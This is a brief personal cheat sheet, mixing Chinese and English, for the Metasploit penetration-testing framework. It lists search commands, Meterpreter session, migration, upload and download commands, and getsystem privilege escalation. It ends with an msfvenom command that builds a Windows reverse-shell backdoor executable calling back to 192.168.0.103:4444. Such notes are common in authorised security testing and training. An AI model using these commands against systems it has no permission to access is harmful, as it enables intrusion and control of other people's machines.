# Metasploit

---

search cve:2009 type:exploit app:client

info 展示相关信息

show advanced 列出所有高级配置

check 检车目标是否选定渗透攻击存在相应安全漏洞


---

# Metgetpid

注入进程　migrate 

上传文件  　upload　　

下载文件　　 download 

session -l 列出可用的交互会话

session -i number 选定会话

获取最高权限  sysinfo getsystem 

---
# msfvenom 

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.103 lport=4444 -f exe -o back.exe

